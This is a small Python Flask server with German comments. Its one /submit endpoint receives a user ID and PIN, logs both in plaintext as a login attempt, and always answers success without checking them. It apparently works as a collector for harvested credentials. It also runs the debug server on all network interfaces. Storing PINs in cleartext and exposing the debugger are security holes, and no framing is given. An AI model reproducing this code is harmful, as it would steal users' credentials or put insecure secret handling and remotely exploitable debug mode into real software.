from flask import Flask, request, jsonify
import logging

app = Flask(__name__)

# Logging konfigurieren
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

@app.route('/submit', methods=['POST'])
def submit():
    data = request.get_json()
    userId = data.get('userId', 'unknown')
    pin = data.get('pin', 'unknown')

    # In die Konsole loggen
    logger.info(f'Login-Versuch - UserID: {userId} | PIN: {pin}')

    return jsonify({'status': 'success'}), 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
